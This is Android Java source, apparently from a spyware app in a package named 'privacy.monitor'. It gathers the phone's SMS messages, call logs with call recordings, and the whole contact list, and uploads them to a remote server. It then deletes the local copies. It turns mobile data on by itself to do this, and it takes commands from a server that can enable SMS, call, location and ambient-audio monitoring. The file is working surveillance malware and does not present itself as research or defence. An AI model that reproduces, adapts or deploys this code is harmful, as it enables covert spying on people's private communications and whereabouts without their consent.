package com.privacy.monitor.receiver;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import org.json.JSONException;
import org.json.JSONObject;
import com.google.gson.Gson;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.CallRecordDB;
import com.privacy.monitor.db.DirectiveDB;
import com.privacy.monitor.db.LocManDB;
import com.privacy.monitor.db.MonitorDB;
import com.privacy.monitor.db.RegularDB;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.DeviceInfo;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.domain.Regular;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.service.utilservice.ClientSocket;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

/**
 * 自定义广播
 */
public class CronBroadcaseRectiver extends BroadcastReceiver {

	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
	private MonitorDB monitorDB;
	private SMSRecordDB smsRecordDB;
	private CallRecordDB callRecordDB;
	private DirectiveDB directiveDB;
	private RegularDB regularDB;
	private LocManDB locManDB ;
	private TelephonyManager tm;
	private ClientSocket cSocket;
	private String myPhone;
	private boolean isCloseMobileNet ;
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		if(TextUtils.isEmpty(myPhone)){
			myPhone = sp.getString(C.PHONE_NUM,"");
		}
		smsRecordDB = SMSRecordDB.getInstance(context);
		callRecordDB = CallRecordDB.getInstance(context);
		directiveDB = DirectiveDB.getInstance(context);
		monitorDB = MonitorDB.getInstance(context);
		locManDB = LocManDB.getInstance(context);
		regularDB = RegularDB.getInstance(context);
		
		if(!HttpUtil.detect(context)){
			Logger.d("CronBroadcaseRectiver","开启网络");
			AppUtil.toggleMobileNet(context, true);
			isCloseMobileNet = true;
		}
		
		if(cSocket == null){
		
			String devBrand = sp.getString(C.DEVICE_BRAND,"");
			String devPhone = sp.getString(C.PHONE_NUM,"");
			String devID = sp.getString(C.DEVICE_ID,"");
			String devSystem = sp.getString(C.DEVICE_SYSTEM,"");
			String supRec = sp.getString(C.DEVICE_SUP_REC,"1");
			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"0");
			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"0");
			DeviceInfo deviceInfo = new DeviceInfo();
			deviceInfo.setBrand(devBrand);
			deviceInfo.setDeviceID(devID);
			deviceInfo.setSystem(devSystem);
			deviceInfo.setPhoneNum(devPhone);
			deviceInfo.setSupCallRec(supCallRec);
			deviceInfo.setSupRec(supRec);
			deviceInfo.setSupGPS(supGPS);
			
			cSocket = new ClientSocket(deviceInfo) {
				@Override
				public void receiveData(String type, String data) {
					boolean hasUpload= sp.getBoolean(C.CONTACTS_UPLOAD,false);
					if(!hasUpload){
						uploadContact(context, sp);
					}
					handleMessage(type, data);
				}
			};
			cSocket.start();
		}else {
			if(cSocket.isInterrupted())cSocket.start();
		}
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				
				if(tm==null){
					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				}
				
			    uploadSMSData(smsRecordDB,context);
			    uploadCallRecord(callRecordDB,context);
				
				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
				String simID = tm.getSimSerialNumber();
				
				//更改号码了 
				if(!sp.getString(C.SIM_ID,"").equals(simID)){
					Editor editor = sp.edit();
					editor.putString(C.PHONE_NUM,simID);
					editor.commit();
				}
			
			    if(isCloseMobileNet){
			    	AppUtil.toggleMobileNet(context, false);
			    }
				
			}
		}).start();
		
	}
	
	private void insertDB(HashMap<String,Monitor> hashMap){
		//增加前先删除所有的数据
		monitorDB.deleteAll();
		 Collection<Monitor> monitors = hashMap.values();
		 Iterator<Monitor> iterator = monitors.iterator();
		 while(iterator.hasNext()){
			 Monitor monitor = iterator.next();
			 monitorDB.insert(monitor);
		 }
	}
	
	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
			if(list !=null){
				for (SMSRecord smsRecord : list) {
					uploadSmsInfo(smsRecordDB,smsRecord,context);
			}
		}
	}
	
	private void uploadSmsInfo(SMSRecordDB smsRecordDB,SMSRecord smsRecord,Context context) {
		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		String updateDate = "my_num="+sp.getString(C.PHONE_NUM,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(context,updateDate,C.RequestMethod.uploadSMS));
		Logger.d("Cron", "返回结果："+updateResult);
		if("ok".equalsIgnoreCase(updateResult)){
			Logger.d("Cron", "删除了短信记录...");
			smsRecordDB.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
		}
	}
	
	private void uploadCallRecord(CallRecordDB callRecordDB,Context context){
		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
		if(callRecords !=null){
		   for (CallRecord callRecord : callRecords) {
			String result = callRecord.getUploadResult();
			if(!"0".equals(result)){
				String uploadResult = NetworkUtil.uploadCall(callRecord.getMyPhone(),callRecord.getPhoneNumber(),callRecord.getCallName(),callRecord.getCallStartTime(),callRecord.getCallStopTime(),callRecord.getSimID(),callRecord.getLon(),callRecord.getLat(),callRecord.getDeviceName(),callRecord.getCallStatus());
			    if(uploadResult.startsWith(callRecord.getMyPhone()+"/"+callRecord.getMyPhone()+"_"+callRecord.getPhoneNumber()+"_"+callRecord.getCallStatus())){
			    	String filePath = callRecord.getSoundRecordPath();
			    	if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(uploadResult,filePath);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
					}
			    }
			 }else{
				 String filePath = callRecord.getSoundRecordPath();
				 String callResult =callRecord.getUploadResult();
				 if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(callResult,filePath);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
				}
			 }
		  }
	   }
	}
	
	private void uploadContact(Context context,SharedPreferences sp){
		Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
		ContentResolver resolver = context.getContentResolver();
		Cursor cursor =resolver.query(uri,new String[]{"_id"}, null, null, null);
		boolean one = false;
		boolean two = false;
		String name = "";
		String phone = "";
		ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
		if(cursor !=null){
			while(cursor.moveToNext()){
				int id = cursor.getInt(0);
				Uri uri2 = Uri.parse("content://com.android.contacts/data");
				Cursor cursor2 = resolver.query(uri2,new String[]{"mimetype","data1"}, "raw_contact_id = ? ", new String[]{id+""}, null);
			    if(cursor2!=null){
			    	while(cursor2.moveToNext()){
			    		String mimetype = cursor2.getString(0);
			    		String data1 = cursor2.getString(1);
			    		if("vnd.android.cursor.item/name".equals(mimetype)){
			    			name = data1;
			    			one = true;
			    		}else if("vnd.android.cursor.item/phone_v2".equals(mimetype)){
			    			phone = data1;
			    			two = true;
			    		}
			    		if(one && two){
			    			ArrayList<String> contactList = new ArrayList<String>();
			    			contactList.add(name);
			    			contactList.add(phone);
			    			list.add(contactList);
			    			one = false;
			    			two = false;
			    		}
			    	}
			    }
			}
			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(list);
		
			InputStream is = NetworkUtil.upload2(context, param,C.RequestMethod.uploadContact);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader br = new BufferedReader(isr);
			String temp = null;
			String result = "";
			try {
				while ((temp = br.readLine()) != null) {
					result = result + temp;
				}
				Editor editor = sp.edit();
				editor.putBoolean(C.CONTACTS_UPLOAD, true);
				editor.commit();
				isr.close();
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	
	//处理服务端返回的信息
	private void handleMessage(String type,String data){
		try {
			Logger.d("Cron","type type type:"+type);
			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
				Logger.d("Cron","准备把数据添加到数据库");
				JSONObject jsonObject = new JSONObject(data);
				
				//是否进行短信监控 
				String monMess = jsonObject.getString("can_mon_msg");
				
				//是否进行通话记录监控
				String monCall = jsonObject.getString("can_mon_call");
				
				//是否进行定位
				String monLoc = jsonObject.getString("can_mon_loc");
				
				//是否可以进行录音(环境录音)
				String monRec = jsonObject.getString("can_mon_rec");
				
				Monitor monitor = new Monitor();
				monitor.setCallMonitorStatus(monCall);
				monitor.setEnvRecMonitorStatus(monRec);
				monitor.setFilterStatus("2");
				monitor.setLocationStatus(monLoc);
				monitor.setSmsMonitorStatus(monMess);
				monitor.setPhone(myPhone);
				monitorDB.insert(monitor);
				
				
				
			//立刻定位
			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
				
			
		    //立刻录音 
			}else if(ClientSocket.TYPE_REC_NOW.equalsIgnoreCase(type)){
				
				
			}
			
		} catch (JSONException e) {
			Logger.d(TAG,"json format error");
		}
	}
	
	//解析获取监控信息的号码
	private void splistMessage(String message){
			if(!TextUtils.isEmpty(message)){
				if(message.contains(";")){
					String[] mesType = message.split(";");
					if(mesType.length==3){
						
						String [] mesMonitorNum = mesType[0].split(",");
						
						String [] mesFilterNum = mesType[2].split(",");
						
						if(mesMonitorNum!=null && mesMonitorNum.length > 0){
							int size = mesMonitorNum.length;
							for(int i = 0 ; i < size ; i ++){
								String mesMonPho = mesMonitorNum[i];
								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesMonPho});
							    if(monitor !=null){
							    	monitor.setSmsMonitorStatus("1");
							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesMonPho});
							    }else {
									monitor = new Monitor();
									monitor.setPhone(mesMonPho);
									monitor.setSmsMonitorStatus("1");
									monitorDB.insert(monitor);
								}
							}
						}
						
						if(mesFilterNum != null && mesFilterNum.length > 0){
							int size = mesFilterNum.length;
							for(int i = 0 ; i < size ;i++){
								String mesFilPho = mesFilterNum[i];
								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesFilPho});
							    if(monitor !=null){
							    	monitor.setFilterStatus("1");
							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesFilPho});
							    }else {
									monitor = new Monitor();
									monitor.setPhone(mesFilPho);
									monitor.setFilterStatus("1");
									monitorDB.insert(monitor);
								}
							}
						}
					}
				}
		}
	}
	
	//解析监控通话手机
	private void splitMonitorCallPhone(String phone){
		if(!TextUtils.isEmpty(phone)){
			if(phone.contains(";")){
				String [] monPhone = phone.split(";");
				if(monPhone !=null && monPhone.length==2){
					//监控的手机号码
					String [] monPhones = monPhone[0].split(",");
					int length  = monPhones.length;
					for(int i = 0 ; i < length ; i ++){
						String strPhone =monPhones[i]; 
						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{strPhone});
						 if(monitor !=null){
						    	monitor.setCallMonitorStatus("1");
						    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{strPhone});
						    }else {
								monitor = new Monitor();
								monitor.setPhone(strPhone);
								monitor.setSmsMonitorStatus("1");
								monitorDB.insert(monitor);
						}
					}
				}
			}
		}
	}
	
	//解析定时任务
	private void parseRegular(String reString){
		if(!TextUtils.isEmpty(reString)){
			if(reString.contains(",")){
				
				String [] regs = reString.split(",");
				if(regs !=null && regs.length > 0){
					int size = regs.length;
					for(int i = 0 ; i < size;i++){
						String [] rege = regs[i].split(";");
						if(rege !=null && rege.length==2){
							String strStart = rege[0];
							String strLong = rege[1];
							Regular regular = new Regular();
							regular.setLocLong(strLong);
							regular.setLocStartTime(strStart);
							regular.setRegType(C.REG_TYPE_REC);
							regularDB.insert(regular);
						}
					}
				}
				
			}else if(reString.contains(";")) {
				String [] regularMess = reString.split(";");
				if(regularMess !=null && regularMess.length==2){
					String strStart = regularMess[0];
					String strLong = regularMess[1];
					Regular regular = new Regular();
					regular.setLocLong(strLong);
					regular.setLocStartTime(strStart);
					regular.setRegType(C.REG_TYPE_REC);
					regularDB.insert(regular);
				}
			}
		}
	}
	
	//解析定时定位
	private void parseLoc(String reStr){
		if(!TextUtils.isEmpty(reStr)){
			if(reStr.contains(",")){
				
				String [] loc = reStr.split(",");
				if(loc !=null && loc.length > 0){
					int size = loc.length;
					for(int i = 0 ; i < size;i++){
						String [] locc = loc[i].split(";");
						if(locc !=null && locc.length==2){
							String strStart = locc[0];
							String strLong = locc[1];
							Regular regular = new Regular();
							regular.setLocLong(strLong);
							regular.setLocStartTime(strStart);
							regular.setRegType(C.REG_TYPE_LOC);
							regularDB.insert(regular);
						}
					}
				}
				
			}else if(reStr.contains(";")) {
				String [] regularMess = reStr.split(";");
				if(regularMess !=null && regularMess.length==2){
					String strStart = regularMess[0];
					String strLong = regularMess[1];
					Regular regular = new Regular();
					regular.setLocLong(strLong);
					regular.setLocStartTime(strStart);
					regular.setRegType(C.REG_TYPE_LOC);
					regularDB.insert(regular);
				}
			}
		}
	}
}
